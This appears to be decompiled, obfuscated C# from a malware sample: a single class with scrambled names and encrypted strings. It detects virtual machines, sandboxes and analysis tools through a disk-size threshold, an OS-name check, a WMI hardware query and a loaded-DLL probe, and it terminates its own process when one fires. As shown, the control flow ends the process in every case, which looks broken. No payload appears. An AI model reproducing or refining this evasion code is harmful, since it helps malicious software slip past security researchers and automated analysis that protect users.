using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic.Devices;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace coxZRmDhvSAWo;

internal sealed class WtqdRPPLGJis
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void BuUPsaMcFCODL()
	{
		if (sIHYxDmVFez() || jaJVTbvEccTqBib() || tQwiDcMPeBeZp() || DImmglMlPtRtuQPu())
		{
			Process.GetCurrentProcess().Kill();
		}
		Environment.FailFast(null);
	}

	private static bool tQwiDcMPeBeZp()
	{
		try
		{
			if (new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize <= 61000000000L)
			{
				return true;
			}
		}
		catch
		{
		}
		return false;
	}

	private static bool DImmglMlPtRtuQPu()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			if (new ComputerInfo().get_OSFullName().ToLower().Contains(getString_0(107401414)))
			{
				return true;
			}
		}
		catch
		{
		}
		return false;
	}

	private static bool sIHYxDmVFez()
	{
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		try
		{
			ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107401409));
			try
			{
				ManagementObjectCollection val2 = val.Get();
				try
				{
					ManagementObjectEnumerator enumerator = val2.GetEnumerator();
					try
					{
						while (enumerator.MoveNext())
						{
							ManagementBaseObject current = enumerator.get_Current();
							string text = current.get_Item(getString_0(107401392)).ToString()!.ToLower();
							if ((text == getString_0(107401855) && current.get_Item(getString_0(107401826)).ToString()!.ToUpperInvariant().Contains(getString_0(107401849))) || text.Contains(getString_0(107401836)) || current.get_Item(getString_0(107401826)).ToString() == getString_0(107401795))
							{
								return true;
							}
						}
					}
					finally
					{
						((IDisposable)enumerator)?.Dispose();
					}
				}
				finally
				{
					((IDisposable)val2)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch
		{
		}
		return false;
	}

	private static bool jaJVTbvEccTqBib()
	{
		try
		{
			if (GetModuleHandle(getString_0(107401810)).ToInt32() != 0)
			{
				return true;
			}
			return false;
		}
		catch
		{
			return false;
		}
	}

	[DllImport("kernel32.dll")]
	public static extern IntPtr GetModuleHandle(string string_0);

	static WtqdRPPLGJis()
	{
		Strings.CreateGetStringDelegate(typeof(WtqdRPPLGJis));
	}
}
